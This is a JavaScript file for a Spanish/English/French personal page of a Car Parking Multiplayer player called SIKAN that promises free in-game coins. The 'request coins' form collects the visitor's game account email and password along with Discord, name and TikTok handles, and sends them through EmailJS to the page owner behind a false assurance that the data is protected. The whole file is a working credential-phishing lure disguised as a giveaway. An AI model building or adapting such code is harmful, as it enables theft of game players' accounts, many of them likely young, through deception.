// Import EmailJS library
const emailjs = require('emailjs-com');

// Configuración de EmailJS con tus IDs
const EMAILJS_CONFIG = {
    publicKey: 'ski84HOi4a8aCWMOu',
    serviceId: 'service_a6007bp',
    templateId: 'template_xjhsbgg'
};

// Inicializar EmailJS
emailjs.init(EMAILJS_CONFIG.publicKey);

// Traducciones
const translations = {
    es: {
        name: "SIKAN",
        title: "Humilde y generoso de CPM",
        about: "Acerca de mí",
        description: "Una persona humilde amante de los autos y que le gusta compartir con la comunidad LATINA y poder regarle cosas relacionadas con CPM.",
        wantCoins: "¡QUIERO MONEDAS!",
        socialMedia: "Redes Sociales",
        communities: "Mis Comunidades",
        join: "Unirse",
        contact: "Contacto",
        requestCoins: "Solicitar Monedas",
        back: "Volver",
        privacyNotice: "ESTOS DATOS NO SERÁN COMPARTIDOS NI PÚBLICOS PARA OTRAS PERSONAS, ESTOS DATOS QUEDARÁN GUARDADOS Y PROTEGIDOS POR SIKAN",
        shareData: "DESPUÉS, COMPARTA SUS DATOS DE CPM EN CORREO Y CONTRASEÑA",
        email: "Correo",
        password: "Contraseña",
        discord: "Discord (OBLIGATORIO TENERLO)",
        nameField: "Nombre",
        userCpm: "User de CPM",
        userTiktok: "User de TikTok",
        submitCoins: "Solicitar Monedas",
        successMessage: "Se ha enviado correctamente los datos, espera a que SIKAN conteste este formulario."
    },
    en: {
        name: "SIKAN",
        title: "Humble and generous from CPM",
        about: "About me",
        description: "A humble person who loves cars and likes to share with the LATIN community and be able to give things related to CPM.",
        wantCoins: "I WANT COINS!",
        socialMedia: "Social Media",
        communities: "My Communities",
        join: "Join",
        contact: "Contact",
        requestCoins: "Request Coins",
        back: "Back",
        privacyNotice: "THIS DATA WILL NOT BE SHARED OR PUBLIC TO OTHER PEOPLE, THIS DATA WILL BE SAVED AND PROTECTED BY SIKAN",
        shareData: "THEN, SHARE YOUR CPM DATA IN EMAIL AND PASSWORD",
        email: "Email",
        password: "Password",
        discord: "Discord (MANDATORY TO HAVE IT)",
        nameField: "Name",
        userCpm: "CPM User",
        userTiktok: "TikTok User",
        submitCoins: "Request Coins",
        successMessage: "The data has been sent correctly, wait for SIKAN to answer this form."
    },
    fr: {
        name: "SIKAN",
        title: "Humble et généreux de CPM",
        about: "À propos de moi",
        description: "Une personne humble qui aime les voitures et aime partager avec la communauté LATINE et pouvoir donner des choses liées au CPM.",
        wantCoins: "JE VEUX DES PIÈCES!",
        socialMedia: "Réseaux Sociaux",
        communities: "Mes Communautés",
        join: "Rejoindre",
        contact: "Contact",
        requestCoins: "Demander des Pièces",
        back: "Retour",
        privacyNotice: "CES DONNÉES NE SERONT PAS PARTAGÉES OU PUBLIQUES À D'AUTRES PERSONNES, CES DONNÉES SERONT SAUVEGARDÉES ET PROTÉGÉES PAR SIKAN",
        shareData: "ENSUITE, PARTAGEZ VOS DONNÉES CPM DANS L'EMAIL ET LE MOT DE PASSE",
        email: "Email",
        password: "Mot de passe",
        discord: "Discord (OBLIGATOIRE DE L'AVOIR)",
        nameField: "Nom",
        userCpm: "Utilisateur CPM",
        userTiktok: "Utilisateur TikTok",
        submitCoins: "Demander des Pièces",
        successMessage: "Les données ont été envoyées correctement, attendez que SIKAN réponde à ce formulaire."
    }
};

let currentLanguage = 'es';

// Función para mostrar el formulario de monedas
function showCoinsForm() {
    const mainPage = document.getElementById('mainPage');
    const formPage = document.getElementById('formPage');
    
    // Animación de salida de la página principal
    mainPage.style.transform = 'translateX(-100%)';
    mainPage.style.opacity = '0';
    
    setTimeout(() => {
        mainPage.style.display = 'none';
        formPage.style.display = 'flex';
        
        // Animación de entrada del formulario
        setTimeout(() => {
            formPage.style.transform = 'translateX(0)';
            formPage.style.opacity = '1';
        }, 50);
    }, 300);
}

// Función para volver a la página principal
function goBackToMain() {
    const mainPage = document.getElementById('mainPage');
    const formPage = document.getElementById('formPage');
    
    // Animación de salida del formulario
    formPage.style.transform = 'translateX(100%)';
    formPage.style.opacity = '0';
    
    setTimeout(() => {
        formPage.style.display = 'none';
        mainPage.style.display = 'flex';
        
        // Animación de entrada de la página principal
        setTimeout(() => {
            mainPage.style.transform = 'translateX(0)';
            mainPage.style.opacity = '1';
        }, 50);
    }, 300);
}

// Función para enviar el formulario con EmailJS
function submitCoinsForm(event) {
    event.preventDefault();
    
    const submitBtn = document.querySelector('.submit-btn');
    const originalText = submitBtn.innerHTML;
    
    // Efecto de carga
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Enviando...</span>';
    submitBtn.disabled = true;
    
    // Obtener datos del formulario
    const formData = {
        email: document.getElementById('email').value,
        password: document.getElementById('password').value,
        discord: document.getElementById('discord').value,
        nombre: document.getElementById('nombre').value,
        userCpm: document.getElementById('userCpm').value,
        userTiktok: document.getElementById('userTiktok').value,
        fecha: new Date().toLocaleString('es-ES')
    };
    
    // Enviar con EmailJS
    emailjs.send(EMAILJS_CONFIG.serviceId, EMAILJS_CONFIG.templateId, formData)
        .then(function(response) {
            console.log('SUCCESS!', response.status, response.text);
            showNotification(translations[currentLanguage].successMessage, 'success');
            document.getElementById('coinsForm').reset();
            
            setTimeout(() => {
                goBackToMain();
            }, 2000);
        })
        .catch(function(error) {
            console.log('FAILED...', error);
            showNotification('Error al enviar. Intenta de nuevo.', 'error');
        })
        .finally(function() {
            submitBtn.innerHTML = originalText;
            submitBtn.disabled = false;
        });
}

// Función para cambiar idioma
function changeLanguage() {
    const selectedLang = document.getElementById('languageSelect').value;
    currentLanguage = selectedLang;
    const elements = document.querySelectorAll('[data-translate]');
    
    elements.forEach(element => {
        const key = element.getAttribute('data-translate');
        if (translations[selectedLang] && translations[selectedLang][key]) {
            element.textContent = translations[selectedLang][key];
        }
    });
    
    // Guardar preferencia de idioma
    localStorage.setItem('preferredLanguage', selectedLang);
    
    // Efecto visual al cambiar idioma
    const card = document.querySelector('.card');
    if (card) {
        card.style.transform = 'scale(0.95)';
        setTimeout(() => {
            card.style.transform = 'scale(1)';
        }, 200);
    }
}

// Función para abrir redes sociales
function openSocial(platform) {
    const urls = {
        instagram: 'https://www.instagram.com/cpm_sikan?igsh=b2NiYTJiODVma2p5&utm_source=qr',
        youtube: 'https://youtube.com/@sikanoficial?si=XalXLF9sWAS7FaoD',
        tiktok: 'https://www.tiktok.com/@sikanoficial2?_t=ZM-8yQOGZ0RJ3u&_r=1'
    };
    
    // Efecto visual
    event.target.closest('.social-link').style.transform = 'scale(0.95)';
    setTimeout(() => {
        event.target.closest('.social-link').style.transform = 'scale(1)';
    }, 150);
    
    showNotification(`Abriendo ${platform.charAt(0).toUpperCase() + platform.slice(1)}...`, 'info');
    
    // Abrir la URL real
    window.open(urls[platform], '_blank');
}

// Función para unirse a comunidades
function joinCommunity(platform) {
    const button = event.target;
    const originalText = button.textContent;
    
    button.textContent = 'Conectando...';
    button.disabled = true;
    
    setTimeout(() => {
        button.textContent = '¡Unido!';
        button.style.background = '#4CAF50';
        
        if (platform === 'discord') {
            window.open('https://discord.gg/4VfdcxmP', '_blank');
        }
        
        showNotification(`¡Te has unido a la comunidad de ${platform.charAt(0).toUpperCase() + platform.slice(1)}!`, 'success');
        
        setTimeout(() => {
            button.textContent = originalText;
            button.disabled = false;
            button.style.background = '#667eea';
        }, 2000);
    }, 1500);
}

// Sistema de notificaciones
function showNotification(message, type = 'info') {
    // Crear elemento de notificación
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.innerHTML = `
        <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-circle' : 'fa-info-circle'}"></i>
        <span>${message}</span>
    `;
    
    // Estilos de la notificación
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: ${type === 'success' ? '#4CAF50' : type === 'error' ? '#f44336' : '#2196F3'};
        color: white;
        padding: 15px 20px;
        border-radius: 10px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        z-index: 1001;
        display: flex;
        align-items: center;
        gap: 10px;
        font-size: 14px;
        max-width: 350px;
        animation: slideInRight 0.3s ease-out;
    `;
    
    // Agregar estilos de animación
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInRight {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        @keyframes slideOutRight {
            from { transform: translateX(0); opacity: 1; }
            to { transform: translateX(100%); opacity: 0; }
        }
    `;
    document.head.appendChild(style);
    
    document.body.appendChild(notification);
    
    // Remover después de 5 segundos
    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease-out';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 300);
    }, 5000);
}

// Efectos adicionales al cargar la página
document.addEventListener('DOMContentLoaded', function() {
    // Cargar idioma guardado
    const savedLang = localStorage.getItem('preferredLanguage');
    if (savedLang) {
        currentLanguage = savedLang;
        document.getElementById('languageSelect').value = savedLang;
        changeLanguage();
    }
    
    // Efecto de aparición gradual para elementos
    const elements = document.querySelectorAll('.social-link, .community');
    elements.forEach((element, index) => {
        element.style.opacity = '0';
        element.style.transform = 'translateY(20px)';
        setTimeout(() => {
            element.style.transition = 'all 0.5s ease';
            element.style.opacity = '1';
            element.style.transform = 'translateY(0)';
        }, index * 100);
    });
    
    // Mensaje de bienvenida
    setTimeout(() => {
        showNotification('¡Bienvenido! Explora mis redes y comunidades 👋', 'info');
    }, 1000);
});

// Efectos de hover adicionales
document.addEventListener('mouseover', function(e) {
    if (e.target.closest('.community')) {
        e.target.closest('.community').style.transform = 'translateX(5px) scale(1.02)';
    }
});

document.addEventListener('mouseout', function(e) {
    if (e.target.closest('.community')) {
        e.target.closest('.community').style.transform = 'translateX(0) scale(1)';
    }
});

// Cerrar con tecla ESC
document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
        const formPage = document.getElementById('formPage');
        if (formPage.style.display !== 'none') {
            goBackToMain();
        }
    }
});